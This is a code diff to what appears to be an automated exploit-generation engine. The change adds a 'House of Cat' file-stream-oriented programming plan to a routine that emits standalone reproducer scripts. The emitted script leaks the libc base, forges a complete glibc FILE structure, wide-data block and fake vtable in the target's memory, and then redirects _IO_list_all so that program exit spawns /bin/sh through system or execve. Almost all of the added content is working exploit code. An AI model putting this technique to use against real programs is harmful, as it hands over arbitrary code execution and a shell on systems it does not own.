@@ -1120,7 +1120,8 @@ def _www_shell(ctx, target, target_bytes, lead, vclass, *, exe, opts, model, wid
                                          width=width))
                 res = _leak.indexed_write_fsop(
                     Path(exe), Path(exe).parent, write_cell=_w, read_cell=_r,
-                    libc_data=libc_data, leak_slots=slots, scratch=base, exit_seqs=exits)
+                    libc_data=libc_data, leak_slots=slots, scratch=base,
+                    scratch_size=int(arr.get("size") or 0), exit_seqs=exits)
                 if res.get("ok"):
                     ctx.progress(msg=f"indexed-write FSOP ({res.get('plan')}): option {writer} "
                                      f"wrote {len(res.get('cells') or ())} House-of-Apple-2 cells "
@@ -1146,6 +1147,8 @@ def _www_repro_script(*, arr_name, arr_addr, stride, writer, reader, fields, rfi
     (`targets`, which `leak.indexed_write_fsop` reports for the plan that worked): the base is
     still leaked at run time, exactly as the engine did it."""
     import json as _json
+
+    from . import heap as _heap
     T = dict(targets or {})
     return ("#!/usr/bin/env python3\n"
             f"# write-what-where -> FSOP reproducer, {plan} plan (stdlib only).\n"
@@ -1156,6 +1159,9 @@ def _www_repro_script(*, arr_name, arr_addr, stride, writer, reader, fields, rfi
             f"SCENTRY={int(T.get('setcontext') or 0):#x}; EXECVE={int(T.get('execve') or 0):#x}; "
             f"BINSH={int(T.get('binsh') or 0):#x}\n"
             f"GREGS={_json.dumps(T.get('fields') or {})}; RIP_AT={int(T.get('rip_at') or 0):#x}\n"
+            f"LIST_ALL={int(T.get('list_all') or 0):#x}; FINISH={(T.get('plan') or 'system')!r}; "
+            f"CAT={{'wide':{_heap.cat_offsets()['wide']:#x},'vt':{_heap.cat_offsets()['vt']:#x},"
+            f"'lock':{_heap.cat_offsets()['lock']:#x},'size':{_heap.CAT_BLOB_MIN:#x}}}\n"
             f"WFIELDS={_json.dumps(fields)}; RFIELDS={_json.dumps(rfields)}; "
             f"WIDTH={width!r}; EXITS={_json.dumps([e.decode('latin1') for e in exits])}\n"
             "EXE=sys.argv[1] if len(sys.argv)>1 else './target.bin'\n"
@@ -1207,7 +1213,28 @@ def _www_repro_script(*, arr_name, arr_addr, stride, writer, reader, fields, rfi
             "print('libc base %#x' % base)\n"
             "fp=base+S['_IO_2_1_stderr_']\n"
             "wide=next(v for v in rd(fp+F['wide']) if base<=v<base+0x600000)\n"
-            "if PLAN=='setcontext':\n"
+            "if PLAN=='cat':\n"
+            "    # House of Cat: do not forge a FILE glibc owns. Build the whole FILE, its\n"
+            "    # _IO_wide_data and its fake _wide_vtable inside the target's own array, then\n"
+            "    # write ONE pointer -- _IO_list_all := &array. _mode is 1 so the flush test\n"
+            "    # reads the WIDE write pointers, which are inside the blob.\n"
+            "    blob=bytearray(CAT['size'])\n"
+            "    def bw(o,v): blob[o:o+8]=struct.pack('<Q', v & (2**64-1))\n"
+            "    if FINISH=='setcontext':\n"
+            "        bw(0x00, 0x8000)                      # _IO_USER_LOCK: skip the lock\n"
+            "        bw(GREGS['rdi'], base+BINSH); bw(GREGS['rsi'], 0); bw(GREGS['rdx'], 0)\n"
+            "        bw(RIP_AT, base+EXECVE); bw(CAT['vt']+0x68, base+SCENTRY)\n"
+            "    else:\n"
+            "        blob[0x00:0x08]=b' /bin/sh'           # _flags doubles as the command\n"
+            "        bw(0x88, ARR+CAT['lock']); bw(0x68, 0); bw(CAT['vt']+0x68, base+S['system'])\n"
+            "    bw(0xa0, ARR+CAT['wide']); bw(0xc0, 1); bw(0xd8, base+S['_IO_wfile_jumps'])\n"
+            "    bw(CAT['wide']+0x18, 0); bw(CAT['wide']+0x20, 1); bw(CAT['wide']+0x30, 0)\n"
+            "    bw(CAT['wide']+0xe0, ARR+CAT['vt'])\n"
+            "    for o in range(0, len(blob), 8):\n"
+            "        v=struct.unpack('<Q', blob[o:o+8])[0]\n"
+            "        if v: wr(ARR+o, v)\n"
+            "    wr(base+LIST_ALL, ARR)\n"
+            "elif PLAN=='setcontext':\n"
             "    # _IO_wdoallocbuf does `mov rdx,rdi` before the vtable call, so the forged FILE\n"
             "    # IS setcontext's ucontext. _IO_UNBUFFERED must go (wdoallocbuf opens\n"
             "    # `test BYTE PTR [rdi],2` and the unbuffered path never reaches the call);\n"
@@ -1251,8 +1278,9 @@ def _file_www_l3(ctx, target, lead, vclass, res, *, arr, writer, reader, width, 
                                fields=model[writer], rfields=model[reader], width=width,
                                exits=exits, plan=plan, targets=res.get("targets"))
     # What the forged FILE's overflow actually ends up calling, per plan.
+    finish = res.get("finish") or plan
     effect = ('execve("/bin/sh", NULL, NULL) through setcontext'
-              if plan == "setcontext" else 'system(" /bin/sh")')
+              if finish == "setcontext" else 'system(" /bin/sh")')
     input_sha = ctx.put_artifact("www-fsop-repro", data=script)
     meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
             "exploit": f"{vclass}->House of Apple 2/{plan} (no win, libc leaked in band)",
